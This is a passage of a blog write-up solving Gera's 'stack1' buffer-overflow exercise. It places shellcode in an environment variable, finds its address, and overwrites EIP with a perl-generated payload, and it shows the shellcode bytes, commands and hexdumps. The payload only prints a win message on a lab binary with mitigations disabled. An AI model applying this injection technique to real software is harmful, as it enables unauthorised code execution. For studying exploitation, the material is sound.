<p>Let&#8217;s now move to the final solution for the <code>stack1</code> program. First,
let&#8217;s have a quick review of solution #3. We injected a shellcode that
simulated the behavior of <code>printf</code> statement. We redirected control to
our shellcode and achieved exploitation. However, a minor modification
was required to our exploit command-line that changed the look and feel
of our winning message. The newline character caused the <code>gets</code> copy
loop to stop overwriting memory addresses past the terminating character
and as such we had to remove it from our exploit shellcode. Although
this issue was easily resolved though a quick and dirty hack, it might
pose significant issues in real world exploit attempts. Could there be a
better/elegant solution to this problem?</p>

<p>Okay, no guess work required here. There indeed is one such trick that
could help us overcome the newline character issue. The shellcode we
injected through the <code>buf</code> array could be stored within an environment
variable and then the EIP could be overwritten with the address of this
variable to get successful execution. But wait! Where did the idea of
environment variable come from? Why are we using it anyways? How exactly
does it help to bypass the newline filter? Let&#8217;s understand these first.</p>

<p>There are a few scenarios in which injecting shellcode through an
environment variable is the only viable option. One such scenario is
when you encounter a buffer that is too small to fit in your desired
shellcode. Since an environment variable could be of arbitrary size, we
could inject a huge shellcode like the one simulating the <a href="http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient">Meterpreter</a>
payload in <a href="http://en.wikibooks.org/wiki/Metasploit">Metasploit Framework</a> and get it executed on the target
system. In our case, we were lucky enough to have a large <code>buf</code> that
could completely hold our <code>printf</code> shellcode. Another scenario could be
when string termination filters, like newline above, are encountered.
For solution #3, we hacked around and got the message printed, but it
obviously won&#8217;t work in all cases. In such a scenario, we could inject
our shellcode into an environment variable. Since the shellcode is
injected independent of the vulnerable program, it helps to bypass its
inherent filters. The only challenging part that remains is redirecting
control to the location where this shellcode in the environment variable
is placed.</p>

<p>One of the most important reason to use an environment variable to hold
exploit shellcode is its memory placement. These variables are copied
into the stack segment of all processes and as such they provide a means
for code execution for stack-based exploits. Let&#8217;s inject the shellcode
we prepared earlier into an environment variable, called <code>WINCODE</code> and
use its address to overwrite EIP and get code execution. There are a few
techniques using which the address of an environment variable can be
accurately calculated and we won&#8217;t need a NOP sled in front of our
shellcode. If you have any queries regarding environment variable based
exploitation, please refer <strong>section 0x331 Using the Environment</strong> from
<a href="https://www.nostarch.com/hacking2.htm">Hacking - The Art of Exploitation</a> book:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># export WINCODE=$(cat shellcode.bin)</span>
<span class="c1">#</span>
<span class="c1"># echo $WINCODE | hexdump -C</span>
<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">20</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y. .<span class="p">|</span>
<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> 0a                                 <span class="p">|</span> win!.<span class="p">|</span>
<span class="m">00000026</span>
<span class="c1">#</span>
<span class="c1"># ./getenv WINCODE</span>
<span class="o">[</span>+<span class="o">]</span> WINCODE: 0xbffff718
<span class="c1">#</span>
<span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1</span>
buf: bffff4d4 cookie: bffff524
you win!#
</code></pre></div>

<p>We successfully redirected EIP to a NOP-less shellcode present within an
environment variable. And it did work! However the output is not exactly
what we had expected. There&#8217;s no newline at the end. Here is what
hexdump has to say about our exploit:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;&#39; | ./stack1 | hexdump -C</span>
<span class="m">00000000</span>  <span class="m">79</span> 6f <span class="m">75</span> <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span>  <span class="m">00</span>                       <span class="p">|</span>you win!.<span class="p">|</span>
<span class="m">00000009</span>
</code></pre></div>

<p>Although the environment variable has a newline at the end, it is not
echoed back when the shellcode executes. I made a small change to the
original shellcode to include <code>0x0a</code> and <code>0x0d</code> characters and used it for
testing:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d&quot;&#39; &gt;shellcode.bin</span>
<span class="c1">#</span>
<span class="c1"># export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|</span>
<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> <span class="m">20</span> 0d 0a                           <span class="p">|</span> win! ..<span class="p">|</span>
<span class="m">00000028</span>
<span class="c1">#</span>
<span class="c1"># ./getenv WINCODE[+] WINCODE: 0xbffff716</span>
<span class="c1">#</span>
<span class="c1"># perl -e &#39;printf &quot;A&quot;x88 . &quot;\x16\xf7\xff\xbf&quot;&#39; | ./stack1</span>
buf: bffff4d4 cookie: bffff524
you win!
</code></pre></div>

<p>This time just the <code>0x0a</code> was echoed back and it, as expected, corrects
the exploit output. However, I could not understand this strange
behavior. If you have any ideas please get back. So, we have now
successfully exploited the <code>stack1</code> program through a shellcode injected
into an environment variable. Please note that the use of environment
variables is only possible for local exploits and as such it is not much
used in common exploits that you see in the wild. However, as you have
already seen, it is one of the most reliable methods of exploitation.</p>

<p>All these solutions are however not practical since they require
disabling of recent mitigation features. They serve the purpose of
understanding how exploits worked before mitigation features were
introduced.</p>

        </div>
        <div class="meta">
          <hr/>
          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank">twitter</a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank">issue</a> on blog repository.</p>
          <hr/>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <table>
                <tr>
                  <td align="left">(share via <a href="mailto:?subject=Gera's Warming Up on Stack #1 - Solutions&body=http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html" target="_blank" title="Share via Email">mail</a>, <a href="http://twitter.com/intent/tweet?text=Gera's Warming Up on Stack #1 - Solutions+http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html&via=7h3rAm" target="_blank" title="Share on Twitter">twitter</a>, <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html&p[images][0]=&p[title]=Gera's Warming Up on Stack #1 - Solutions&p[summary]=Solutions for Gera's Warming up on Stack #1 program." target="_blank" title="Share on Facebook">facebook</a> or <a href="https://plus.google.com/share?url=http://7h3ram.github.io//2012/geras-wuos-stack1-solutions.html" target="_blank" title="Share on Google Plus">google-plus</a>)</td>
                  <td align="right">(tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a>, <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a> and <a href=/tags.html#writeups>writeups</a>)</td>
                </tr>
                <tr>
                                      <td align="left"><a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt;&lt; Exploit Mitigation Techniques on Linux Systems &lt;&lt;</a></td>
                    <td align="right"><a href="/2012/word-list-builder-dic-file-parsing-seh.html">&gt;&gt; Word List Builder .dic File Parsing SEH Overflow &gt;&gt;</a></td>
                                  </tr>
              </table>
                                                      </div>
        </div>
      </div>
    </div>
  </div>
  </article>
              <div class="footer">
          <center>
            <a href="/rss.xml" target="_blank">rss</a> | <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">license</a>
          </center>
        </div>
          </section>
  </body>
</html>